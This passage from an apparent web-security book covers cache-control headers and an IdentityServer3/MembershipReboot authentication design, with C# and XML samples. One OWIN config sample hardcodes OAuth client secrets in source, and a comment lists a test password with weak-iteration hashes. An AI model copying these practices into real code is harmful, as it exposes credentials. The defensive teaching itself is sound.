<p>The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed. Feed with the data you want protected and a unique salt. All good frameworks will have at least PBKDF2 and bcrypt APIs.</p>

<p>Possibly also worth considering if you like the bleeding edge, is the new Argon2.</p>

<h5 id="web-applications-countermeasures-management-of-application-secrets-caching-of-sensitive-data">Caching of Sensitive Data</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionVERYEASY.png"/>


<p>Logging out from an application obviously does not clear the browser cache of any sensitive information that might have been stored. Test that any sensitive data responses have <code>Cache-Control</code> and <code>Expires</code> headers set appropriately.</p>

<p>Use an HTTP intercepting proxy such as ZAP, Burp, etc, to search through the server responses that belong to the session, checking that the server instructed the browser not to cache any data for all responses containing sensitive information.</p>

<p>Use the following headers on such responses:</p>

<p><code>Cache-Control: no-cache, no-store</code><br />
<code>Expires: 0, or past date</code><br />
<code>Pragma: no-cache</code>  </p>

<p>You can also add the following flags to the <code>Cache-Control</code> header in order to better prevent persistently linked files on the filesystem:</p>

<p><code>must-revalidate</code>, <code>pre-check=0</code>, <code>post-check=0</code>, <code>max-age=0</code>, and <code>s-maxage=0</code></p>

<p>To check that the browsers are respecting the headers, check the cache stores. For example:</p>

<p>For Mozilla Firefox:</p>

<ul>
  <li>Unix/Linux: <code>~/.mozilla/firefox/&lt;profile-id&gt;/Cache/</code>
</li>
  <li>Windows: <code>C:\Documents and Settings\&lt;user_name&gt;\Local Settings\Application Data\</code><br />
<code>Mozilla\Firefox\Profiles\&lt;profile-id&gt;\Cache&gt;</code>
</li>
</ul>

<p>For Internet Explorer:</p>

<ul>
  <li><code>C:\Documents and Settings\&lt;user_name&gt;\Local Settings\Temporary Internet Files&gt;</code></li>
</ul>

<p>Don’t forget to plug all your changes into your Zap Regression Test suite as discussed in the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-cracking">Cracking</h5>

<p>Slowing down and rendering cracking infeasible is addressed by the type of KDF and number of rounds you configure. We dealt with this in the “<a href="chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use">Which KDF to use</a>” section.</p>

<h4 id="web-applications-countermeasures-lack-of-authentication-authorisation-session-management">Lack of Authentication, Authorisation and Session Management</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionDIFFICULT.png"/>


<p>I’m going to walk you through some of the important parts of what a possible authentication and authorisation solution might look like that will address the points raised in the <a href="chap06.html#web-applications-identify-risks-lack-of-authentication-authorisation-session-management">Identify Risks</a> section from above.</p>


<img src="images/RelevantAuthStandards.png"/>


<p>The following code is one example of how we can establish authentication and authorisation of individuals desiring to work with a system comprised of any number of front-ends (web, mobile, etc), a service layer API that provides an abstraction to, and communicates with the underlying back-end micro-services. The example uses the Resource Owner Password Credentials (ROPC) flow which is quite a common flow with todays front-end -&gt; service API -&gt; back-end micro-service architectures.</p>

<p>It’s also worth checking out the following sections in the OAuth 2.0 specification around the ROPC flow:</p>

<ul>
  <li><a href="http://tools.ietf.org/html/rfc6749#section-1.3.3">Resource Owner Password Credentials</a></li>
  <li><a href="http://tools.ietf.org/html/rfc6749#section-4.3">Resource Owner Password Credentials Grant</a></li>
  <li><a href="http://tools.ietf.org/html/rfc6749#section-10.7">Security Considerations</a></li>
</ul>

<p>All the flows are detailed in the <a href="http://tools.ietf.org/html/rfc6749">OAuth 2.0</a> and <a href="http://openid.net/specs/openid-connect-core-1_0.html">OpenID Connect</a> specifications.</p>

<p>We’ll also discuss integrating external identity providers (The Facebooks, Twitters and Googles) of our world. </p>

<h5 id="leanpub-auto-chosen-technologies">Chosen technologies:</h5>


<img src="images/ChosenAuthTechnologies.png"/>


<p>Getting to grips with and understanding enough to create a solution like this can be quite a steep learning experience. The folks from IdentityServer which do this for the love of it have created an outstanding Open Source Software (OSS) project and in all my dealings with them have always gone out of their way to help. In all the projects I’ve worked on, with all the edge cases, there has always been a way to create the solution that satisfied the requirements.</p>

<h5 id="leanpub-auto-technology-and-design-decisions">Technology and Design Decisions</h5>

<h6 id="leanpub-auto-reference-token-vs-json-web-token-jwt">Reference Token vs JSON Web Token (JWT)</h6>

<p>Ideally reference access tokens should be used between front-end(s) and the service layer, which they are in this case. Then JWT, which contains a signed list of the users claims, from the service layer to the back-end micro-services.</p>

<p>JWTs can not be revoked as they are self contained (contain everything about a user that is necessary to make a decision about what the user should be authorised to access)</p>

<p>Reference tokens on the other hand simply contain a reference to the user account which is managed by identity server via MembershipReboot in this case. Thus enabling revocation (logging out of the user for example).</p>

<p>Identity server does not currently support both types of token at once, being able to switch between one or the other (reference for front-end, JWT for back-end), although it is <a href="https://github.com/IdentityServer/IdentityServer3/issues/1725">on the road map</a>. Until this configuration is supported, the service layer can get the users claims by using the reference token. One of those claims being the user GUID. The claims could then be propagated to the micro-services.</p>

<h6 id="leanpub-auto-identityserver3">IdentityServer3</h6>

<p>IdentityServer2 was focussed around authentication with some OAuth2 support to assist with authentication.<br />
AuthorizationServer was more focused on OAuth2 for delegated authorisation.<br />
IdentityServer3 is a C#.NET library that focusses on both authentication and authorisation. You don’t have to have your surrounding out of process components (service layer, micro-services) in .NET for IdentityServer3 to be a viable option. They could be written in another language, so long as they speak HTTP.</p>

<h6 id="web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot">MembershipReboot</h6>

<p>Is a user identity management library with a similar name to the ASP.NET Membership Provider, inspired by it due to <a href="http://brockallen.com/2012/09/02/think-twice-about-using-membershipprovider-and-simplemembership/">frustrations</a> that Brock Allen (MembershipReboot creator) had from it such as:  </p>

<ol class="numeric">
  <li>A misguided false perception of security, which I agree with</li>
  <li>A leaky abstraction due to the 27 abstract methods that may or may not be pertinent to your applications needs. Any custom provider you build will need to implement all of these methods whether they are useful to your application or not, otherwise consumers of your custom provider will receive a NotImplementedException. If you choose to only implement the methods that make sense for your application, then the consumers need to know to much about your custom providers internals. Hence encapsulation has broken down and abstraction is leaking.</li>
  <li>The lockout feature, where as when a certain number of incorrect login attempts occurred, the account would be locked, preventing any further attempts. Also preventing the legitimate account owner from logging in, thus a denial of service (DoS), as there is no ability to unlock the account after a certain period of time. With MembershipReboot we have the <code>AccountLockoutFailedLoginAttempts</code> and the much needed <code>AccountLockoutDuration</code> on the <code>MembershipRebootConfiguration</code> class which does what you expect it to do.</li>
  <li>Others</li>
</ol>

<p>Some note worthy benefits I’ve found with MembershipReboot are:</p>

<ol class="numeric">
  <li>From a project I was working on a few years back, MembershipUser was not providing the properties we needed, so having to hide MembershipUser as an Adaptee within an Adapter pattern implementation, a bit like this:
    <figure class="code">
      <figcaption>MembershipUser.cs</figcaption>

<div class="highlight"><pre><code></code> <code class="k">namespace</code> <code class="nn">My.MembershipAPI</code> <code class="p">{</code>
    <code class="c1">/// &lt;summary&gt;</code>
    <code class="c1">/// Utilising the Adapter pattern, gives us control over the Target (MembershipUser)</code>
    <code class="c1">/// interface. The adapter interface (CustomMembershipUser) provides members that</code>
    <code class="c1">/// our client (that's our call sites) can use.</code>
    <code class="c1">/// The MembershipUser interface can't be used by our clients as it is, because</code>
    <code class="c1">/// we have a different set of parameters to pass.</code>
    <code class="c1">/// Hence we provide an adapter (CustomMembershipUser)</code>
    <code class="c1">/// The Adaptee (User) becomes part of the Target (MembershipUser) by way of</code>
    <code class="c1">/// Adapter (CustomMembershipUser)</code>
    <code class="c1">/// &lt;/summary&gt;</code>
    <code class="k">public</code> <code class="k">class</code> <code class="nc">CustomMembershipUser</code> <code class="p">:</code> <code class="n">MembershipUser</code> <code class="p">{</code>
       
       <code class="k">public</code> <code class="nf">CustomMembershipUser</code><code class="p">(</code>
          <code class="n">MembershipUser</code> <code class="n">membershipUser</code><code class="p">,</code>
          <code class="kt">string</code> <code class="n">firstName</code><code class="p">,</code>
          <code class="kt">string</code> <code class="n">lastName</code><code class="p">,</code>
          <code class="kt">long</code> <code class="n">securityQuestionId</code><code class="p">,</code>
          <code class="kt">bool</code> <code class="n">isBusinessAStartup</code><code class="p">,</code>
          <code class="kt">string</code> <code class="n">businessName</code>
       <code class="p">)</code> <code class="p">:</code> <code class="k">base</code> <code class="p">(</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">ProviderName</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">UserName</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">ProviderUserKey</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">Email</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">PasswordQuestion</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">Comment</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">IsApproved</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">IsLockedOut</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">CreationDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastLoginDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastActivityDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastPasswordChangedDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastLockoutDate</code>
       <code class="p">)</code> <code class="p">{</code>
          <code class="n">UserAccount</code> <code class="p">=</code> <code class="k">new</code> <code class="n">User</code> <code class="p">{</code>
             <code class="n">FirstName</code> <code class="p">=</code> <code class="n">firstName</code><code class="p">,</code>
             <code class="n">LastName</code> <code class="p">=</code> <code class="n">lastName</code><code class="p">,</code>
             <code class="n">SecurityQuestionId</code> <code class="p">=</code> <code class="n">securityQuestionId</code><code class="p">,</code>
             <code class="n">isBusinessAStartup</code> <code class="p">=</code> <code class="n">isBusinessAStartup</code><code class="p">,</code>
             <code class="n">MembershipUserId</code> <code class="p">=</code> <code class="p">(</code><code class="n">Guid</code><code class="p">)</code><code class="n">membershipUser</code><code class="p">.</code><code class="n">ProviderUserKey</code><code class="p">,</code>
             <code class="n">BusinessName</code> <code class="p">=</code> <code class="n">businessName</code>
          <code class="p">};</code>
       <code class="p">}</code>
          
       <code class="k">public</code> <code class="nf">CustomMembershipUser</code><code class="p">(</code><code class="n">MembershipUser</code> <code class="n">membershipUser</code><code class="p">)</code> <code class="p">:</code> <code class="k">base</code> <code class="p">(</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">ProviderName</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">UserName</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">ProviderUserKey</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">Email</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">PasswordQuestion</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">Comment</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">IsApproved</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">IsLockedOut</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">CreationDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastLoginDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastActivityDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastPasswordChangedDate</code><code class="p">,</code>
          <code class="n">membershipUser</code><code class="p">.</code><code class="n">LastLockoutDate</code>
       <code class="p">)</code> <code class="p">{}</code>
          
       <code class="c1">/// &lt;summary&gt;</code>
       <code class="c1">/// Provides get and set access to our User </code>
       <code class="c1">/// &lt;/summary&gt;</code>
       <code class="k">public</code> <code class="n">User</code> <code class="n">UserAccount</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
    <code class="p">}</code>
 <code class="p">}</code>
</pre></div>

    </figure>

    <p>Where as going down the path of <a href="https://github.com/brockallen/BrockAllen.MembershipReboot">MembershipReboot</a> and <a href="https://github.com/IdentityServer/IdentityServer3.MembershipReboot">IdentityServer3.MembershipReboot</a> which is a “<em>User Service plugin for IdentityServer v3 that uses MembershipReboot as its identity management library. In other words, you’re using IdentityServer v3 and you want to use MembershipReboot as your database for user passwords…</em>” provides the ability to customise, out of the box. All you need to do is add the properties you require to the already provided <a href="https://github.com/IdentityServer/IdentityServer3.MembershipReboot/blob/master/source/WebHost/MR/CustomUser.cs"><code>CustomUser</code></a> and the data store schema which is also provided in an Entity Framework project that comes with MembershipReboot.</p>

    <figure class="code">
      <figcaption>IdentityServer3.MembershipReboot\source\WebHost\MR\CustomUser.cs</figcaption>

<div class="highlight"><pre><code></code> <code class="k">namespace</code> <code class="nn">WebHost.MR</code> <code class="p">{</code>
    <code class="k">public</code> <code class="k">class</code> <code class="nc">CustomUser</code> <code class="p">:</code> <code class="n">RelationalUserAccount</code> <code class="p">{</code>
       <code class="k">public</code> <code class="k">virtual</code> <code class="kt">string</code> <code class="n">FirstName</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
       <code class="k">public</code> <code class="k">virtual</code> <code class="kt">string</code> <code class="n">LastName</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
       <code class="k">public</code> <code class="k">virtual</code> <code class="kt">int?</code> <code class="n">Age</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
    <code class="p">}</code>
       
    <code class="k">public</code> <code class="k">class</code> <code class="nc">CustomUserAccountService</code> <code class="p">:</code> <code class="n">UserAccountService</code><code class="p">&lt;</code><code class="n">CustomUser</code><code class="p">&gt;</code> <code class="p">{</code>
       <code class="k">public</code> <code class="nf">CustomUserAccountService</code><code class="p">(</code><code class="n">CustomConfig</code> <code class="n">config</code><code class="p">,</code> <code class="n">CustomUserRepository</code> <code class="n">repo</code><code class="p">)</code>
          <code class="p">:</code> <code class="k">base</code><code class="p">(</code><code class="n">config</code><code class="p">,</code> <code class="n">repo</code><code class="p">)</code> <code class="p">{</code>
       <code class="p">}</code>
    <code class="p">}</code>
       
    <code class="k">public</code> <code class="k">class</code> <code class="nc">CustomUserRepository</code>
       <code class="p">:</code> <code class="n">DbContextUserAccountRepository</code><code class="p">&lt;</code><code class="n">CustomDatabase</code><code class="p">,</code> <code class="n">CustomUser</code><code class="p">&gt;</code> <code class="p">{</code>
          <code class="k">public</code> <code class="nf">CustomUserRepository</code><code class="p">(</code><code class="n">CustomDatabase</code> <code class="n">ctx</code><code class="p">)</code> <code class="p">:</code> <code class="k">base</code><code class="p">(</code><code class="n">ctx</code><code class="p">)</code> <code class="p">{}</code>
    <code class="p">}</code>
 <code class="p">}</code>
</pre></div>

    </figure>
  </li>
  <li>The security focussed <a href="https://github.com/brockallen/BrockAllen.MembershipReboot/wiki/Security-Settings-Configuration">configuration</a>. You can choose to set this within code or config.<br />
Password storage (as discussed above under the <a href="chap06.html#web-applications-countermeasures-data-store-compromise">Data-store Compromise</a> section is <a href="http://brockallen.com/2014/02/09/how-membershipreboot-stores-passwords-properly/">addressed</a> by using the mature PBKDF2 and providing a config setting in the form of <code>passwordHashingIterationCount</code> on the <code>MembershipRebootConfiguration</code> class to dial in the number of iterations (stretching), as seen below on line 29. This provides us with what’s known as an adaptive one-way function. Adaptive because the workload increases each year to keep up with advances in hardware technology. You now have control of how slow you want it to be to crack those passwords. What’s more, the iteration count can be set to change each year automatically. If the developer chooses not to touch the iteration count at all (or more likely, forgets), then the default of 0 is inferred. 0 means to automatically calculate the number based on the <a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet">OWASP recommendations</a> for the current year. In the year 2000 it should be 1000 iterations. The count should be doubled each subsequent two years, so in 2016 we should be using 256000 iterations and that’s what MembershipReboot does if the setting is not changed.
    <figure class="code">
      <figcaption>backend\Auth\AuthService.WebApi\app.config</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code> <code class="c">&lt;!--Lives in Auth Service of Architecture diagram below.--&gt;</code>
<code class="lineno"> 2 </code> <code class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</code>
<code class="lineno"> 3 </code> <code class="nt">&lt;configuration&gt;</code>
<code class="lineno"> 4 </code>   <code class="nt">&lt;configSections&gt;</code>
<code class="lineno"> 5 </code>     <code class="nt">&lt;section</code>
<code class="lineno"> 6 </code>       <code class="na">name=</code><code class="s">"membershipReboot"</code>
<code class="lineno"> 7 </code>       <code class="na">type=</code><code class="s">"BrockAllen.MembershipReboot.SecuritySettings,</code>
<code class="lineno"> 8 </code><code class="s">       BrockAllen.MembershipReboot"</code> <code class="nt">/&gt;</code>
<code class="lineno"> 9 </code>     <code class="nt">&lt;section</code>
<code class="lineno">10 </code>       <code class="na">name=</code><code class="s">"entityFramework"</code>
<code class="lineno">11 </code>       <code class="na">type=</code><code class="s">"System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection,</code>
<code class="lineno">12 </code><code class="s">       EntityFramework,</code>
<code class="lineno">13 </code><code class="s">       Version=6.0.0.0,</code>
<code class="lineno">14 </code><code class="s">       Culture=neutral,</code>
<code class="lineno">15 </code><code class="s">       PublicKeyToken=b77a5c561934e089"</code>
<code class="lineno">16 </code>       <code class="na">requirePermission=</code><code class="s">"false"</code> <code class="nt">/&gt;</code>
<code class="lineno">17 </code>     <code class="nt">&lt;connectionStrings&gt;</code>
<code class="lineno">18 </code>       <code class="nt">&lt;add</code> 
<code class="lineno">19 </code>         <code class="na">name=</code><code class="s">"MembershipReboot"</code>
<code class="lineno">20 </code>         <code class="na">connectionString=</code>
<code class="lineno">21 </code>         <code class="s">"Data Source=(LocalDb)\v11.0;InitialCatalog=AuthServiceDb;Integrated Security=True"</code>
<code class="lineno">22 </code>         <code class="na">providerName=</code><code class="s">"System.Data.SqlClient"</code> <code class="nt">/&gt;</code>      
<code class="lineno">23 </code>     <code class="nt">&lt;/connectionStrings&gt;</code>
<code class="lineno">24 </code>     <code class="nt">&lt;membershipReboot</code>
<code class="lineno">25 </code>       <code class="na">requireAccountVerification=</code><code class="s">"true"</code>
<code class="lineno">26 </code>       <code class="na">emailIsUsername=</code><code class="s">"false"</code>
<code class="lineno">27 </code>       <code class="na">multiTenant=</code><code class="s">"false"</code>
<code class="lineno">28 </code>       <code class="na">allowAccountDeletion=</code><code class="s">"true"</code>
<code class="lineno">29 </code>       <code class="na">passwordHashingIterationCount=</code><code class="s">"0"</code>
<code class="lineno">30 </code>       <code class="na">accountLockoutDuration=</code><code class="s">"00:01:00"</code>
<code class="lineno">31 </code>       <code class="na">passwordResetFrequency=</code><code class="s">"0"</code> <code class="nt">/&gt;</code>          
<code class="lineno">32 </code>     <code class="c">&lt;!--</code>
<code class="lineno">33 </code><code class="c">     Test user bob with password secret was created with 10 iterations of the PBKDF2 KDF</code>
<code class="lineno">34 </code><code class="c">        </code>
<code class="lineno">35 </code><code class="c">     "secret" 10 iterations:</code>
<code class="lineno">36 </code><code class="c">     A.ABP7I2M56JTnekBoUjUtG7G4poxMO3Br+cAPgXqYx//0KKxqILb7uYjuE9ofBr7amQ==</code>
<code class="lineno">37 </code><code class="c">     "secret" 10000 iterations:</code>
<code class="lineno">38 </code><code class="c">     3E800.AN02zizsHZG45IlCu0/8UjPZuwcopaSSBkU/d6VHq3pknf2BE7ExiLL38clIKn575g==</code>
<code class="lineno">39 </code><code class="c">        </code>
<code class="lineno">40 </code><code class="c">     Some more details on how the hash is constructed can be found here:</code>
<code class="lineno">41 </code><code class="c">     https://github.com/brockallen/BrockAllen.MembershipReboot/issues/603</code>
<code class="lineno">42 </code><code class="c">     --&gt;</code>
<code class="lineno">43 </code>   <code class="nt">&lt;/configSections&gt;</code>  
<code class="lineno">44 </code> <code class="nt">&lt;/configuration&gt;</code>
</pre></div>

    </figure>

    <p>The iteration count of each users password is stored with the hashed password, as can be seen above on lines 36 and 38. This means each password can have a different number of iterations applied over time as required. Beautifully thought out!</p>

    <p>With the ASP.NET Membership Provider you can have salted SHA1 which as already mentioned was not designed for what it was chosen to be used for in this case and there doesn’t appear to be any thought to (Moore’s Law) the fact that machines keep getting faster. MD5 and SHA were designed to be fast, not slow and able to be slowed down. So storing passwords by SHA-1 hashing means they are incredibly fast to crack.</p>
  </li>
</ol>

<p>Sadly the next offering in this space (ASP.NET Identity) that Microsoft produced also seems inferior. Brock Allen blogged about some of the short comings in his post titled “<em><a href="http://brockallen.com/2013/10/20/the-good-the-bad-and-the-ugly-of-asp-net-identity/#ugly">The good, the bad and the ugly of ASP.NET Identity</a></em>” in which MembershipReboot caters for, such as the following:</p>

<ul>
  <li>Email account verification</li>
  <li>Password reset</li>
  <li>Username reminder</li>
  <li>Account lockout</li>
  <li>Password guessing prevention</li>
  <li>Close/Delete account</li>
  <li>Modern password storage strategies (as already discussed)</li>
  <li>Mobile phone verification</li>
  <li>Two factor authentication</li>
  <li>Certificate based authentication</li>
  <li>Auditing</li>
  <li>Tracing</li>
</ul>

<h6 id="leanpub-auto-external-identity-providers">External Identity Providers</h6>

<p>Microsoft Katana provides support for</p>

<ul>
  <li>WS-Federation</li>
  <li>OpenID Connect</li>
  <li>Google</li>
  <li>Twitter</li>
  <li>Microsoft Account</li>
  <li>Facebook</li>
</ul>

<p>There are also many other community provided <a href="https://github.com/RockstarLabs/OwinOAuthProviders">OWIN OAuth middleware providers</a> </p>

<p>The OWIN startup or config file could look like the following. You can see in the second half of the code file is the configuration of the external identity providers:</p>

<figure class="code">
  <figcaption>backend\Auth\AuthService.WebApi\Owin\OwinConfig.cs</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Lives in Auth Service of Architecture diagram below.</code>
<code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Collections.Generic</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Security.Cryptography.X509Certificates</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Web.Http</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">AuthService.WebApi.IdSvr</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityManager.Logging</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityManager.Core.Logging</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">IdentityServer3.Core.Configuration</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Infrastructure.IOC</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Infrastructure.WebApi.Owin</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Microsoft.Owin.Security.Facebook</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Microsoft.Owin.Security.Google</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Microsoft.Owin.Security.Twitter</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Owin</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Serilog</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">AuthService.WebApi.Owin</code> <code class="p">{</code>

   <code class="k">public</code> <code class="k">class</code> <code class="nc">OwinConfig</code> <code class="p">:</code> <code class="n">IOwinConfig</code> <code class="p">{</code>
      <code class="c1">// Todo: Add to config file</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="n">Name</code> <code class="p">=&gt;</code> <code class="s">"Auth Service OWIN Self-Host"</code><code class="p">;</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="n">Protocol</code> <code class="p">=&gt;</code> <code class="s">"https"</code><code class="p">;</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="n">HostName</code> <code class="p">=&gt;</code> <code class="s">"localtest.me"</code><code class="p">;</code>
      <code class="k">public</code> <code class="kt">int</code> <code class="n">Port</code> <code class="p">=&gt;</code> <code class="m">44334</code><code class="p">;</code>
      <code class="k">public</code> <code class="n">List</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">&gt;</code> <code class="n">Subdomains</code> <code class="p">=&gt;</code> <code class="k">new</code> <code class="n">List</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">&gt;</code> <code class="p">{</code> <code class="s">"identity"</code> <code class="p">};</code>

      <code class="k">public</code> <code class="n">HttpConfiguration</code> <code class="nf">BuildConfiguration</code><code class="p">(</code><code class="n">IAppBuilder</code> <code class="n">app</code><code class="p">)</code> <code class="p">{</code>
         <code class="c1">// Unhandled exception logger.</code>
         <code class="n">app</code><code class="p">.</code><code class="n">Use</code><code class="p">&lt;</code><code class="n">GlobalExceptionMiddleware</code><code class="p">&gt;();</code>

         <code class="n">LogProvider</code><code class="p">.</code><code class="n">SetCurrentLogProvider</code><code class="p">(</code><code class="k">new</code> <code class="n">DiagnosticsTraceLogProvider</code><code class="p">());</code>
         <code class="c1">// TODO: Needs to use IoC to initialise the api controllers.</code>
         <code class="n">Log</code><code class="p">.</code><code class="n">Logger</code> <code class="p">=</code> <code class="n">Ioc</code><code class="p">.</code><code class="n">Get</code><code class="p">&lt;</code><code class="n">Infrastructure</code><code class="p">.</code><code class="n">Logging</code><code class="p">.</code><code class="n">ILog</code><code class="p">&gt;().</code><code class="n">Logger</code><code class="p">;</code>    

         <code class="n">IdentityServerServiceFactory</code> <code class="n">idSvrFactory</code> <code class="p">=</code>
         <code class="n">Factory</code><code class="p">.</code><code class="n">Configure</code><code class="p">(</code><code class="n">AuthServiceWebApiConstants</code><code class="p">.</code><code class="n">ConnectionString</code><code class="p">);</code>
         <code class="n">idSvrFactory</code><code class="p">.</code><code class="n">ConfigureCustomUserService</code><code class="p">(</code>
            <code class="n">AuthServiceWebApiConstants</code><code class="p">.</code><code class="n">ConnectionString</code>
         <code class="p">);</code>

         <code class="n">IdentityServerOptions</code> <code class="n">options</code> <code class="p">=</code> <code class="k">new</code> <code class="n">IdentityServerOptions</code> <code class="p">{</code>
            <code class="n">SiteName</code> <code class="p">=</code> <code class="s">"Auth Service"</code><code class="p">,</code>
            <code class="n">SigningCertificate</code> <code class="p">=</code> <code class="n">LoadCertificate</code><code class="p">(),</code>
            <code class="n">Factory</code> <code class="p">=</code> <code class="n">idSvrFactory</code><code class="p">,</code>
            <code class="n">AuthenticationOptions</code> <code class="p">=</code> <code class="k">new</code> <code class="n">AuthenticationOptions</code> <code class="p">{</code>
               <code class="n">IdentityProviders</code> <code class="p">=</code> <code class="n">ConfigureAdditionalIdentityProviders</code><code class="p">,</code>
            <code class="p">},</code>
            <code class="n">RequireSsl</code> <code class="p">=</code> <code class="k">true</code> <code class="c1">// Default = true.                </code>
         <code class="p">};</code>

         <code class="n">app</code><code class="p">.</code><code class="n">UseIdentityServer</code><code class="p">(</code><code class="n">options</code><code class="p">);</code>

         <code class="k">return</code> <code class="k">new</code> <code class="nf">HttpConfiguration</code><code class="p">();</code>
      <code class="p">}</code>

      <code class="k">public</code> <code class="k">static</code> <code class="k">void</code> <code class="nf">ConfigureAdditionalIdentityProviders</code><code class="p">(</code>
         <code class="n">IAppBuilder</code> <code class="n">app</code><code class="p">,</code>
         <code class="kt">string</code> <code class="n">signInAsType</code>
      <code class="p">)</code> <code class="p">{</code>
         <code class="n">GoogleOAuth2AuthenticationOptions</code> <code class="n">google</code> <code class="p">=</code> <code class="k">new</code> <code class="n">GoogleOAuth2AuthenticationOptions</code> <code class="p">{</code>
            <code class="n">AuthenticationType</code> <code class="p">=</code> <code class="s">"Google"</code><code class="p">,</code>
            <code class="n">SignInAsAuthenticationType</code> <code class="p">=</code> <code class="n">signInAsType</code><code class="p">,</code>
            <code class="n">ClientId</code> <code class="p">=</code>
               <code class="s">"767400843187-8boio83mb57ruogr9af9ut09fkg56b27.apps.googleusercontent.com"</code><code class="p">,</code>
            <code class="n">ClientSecret</code> <code class="p">=</code> <code class="s">"5fWcBT0udKY7_b6E3gEiJlze"</code>
         <code class="p">};</code>
         <code class="n">app</code><code class="p">.</code><code class="n">UseGoogleAuthentication</code><code class="p">(</code><code class="n">google</code><code class="p">);</code>

         <code class="n">FacebookAuthenticationOptions</code> <code class="n">fb</code> <code class="p">=</code> <code class="k">new</code> <code class="n">FacebookAuthenticationOptions</code> <code class="p">{</code>
            <code class="n">AuthenticationType</code> <code class="p">=</code> <code class="s">"Facebook"</code><code class="p">,</code>
            <code class="n">SignInAsAuthenticationType</code> <code class="p">=</code> <code class="n">signInAsType</code><code class="p">,</code>
            <code class="n">AppId</code> <code class="p">=</code> <code class="s">"676607329068058"</code><code class="p">,</code>
            <code class="n">AppSecret</code> <code class="p">=</code> <code class="s">"9d6ab75f921942e61fb43a9b1fc25c63"</code>
         <code class="p">};</code>
         <code class="n">app</code><code class="p">.</code><code class="n">UseFacebookAuthentication</code><code class="p">(</code><code class="n">fb</code><code class="p">);</code>

         <code class="n">TwitterAuthenticationOptions</code> <code class="n">twitter</code> <code class="p">=</code> <code class="k">new</code> <code class="n">TwitterAuthenticationOptions</code> <code class="p">{</code>
            <code class="n">AuthenticationType</code> <code class="p">=</code> <code class="s">"Twitter"</code><code class="p">,</code>
            <code class="n">SignInAsAuthenticationType</code> <code class="p">=</code> <code class="n">signInAsType</code><code class="p">,</code>
            <code class="n">ConsumerKey</code> <code class="p">=</code> <code class="s">"N8r8w7PIepwtZZwtH066kMlmq"</code><code class="p">,</code>
            <code class="n">ConsumerSecret</code> <code class="p">=</code> <code class="s">"df15L2x6kNI50E4PYcHS0ImBQlcGIt6huET8gQN41VFpUCwNjM"</code>
         <code class="p">};</code>
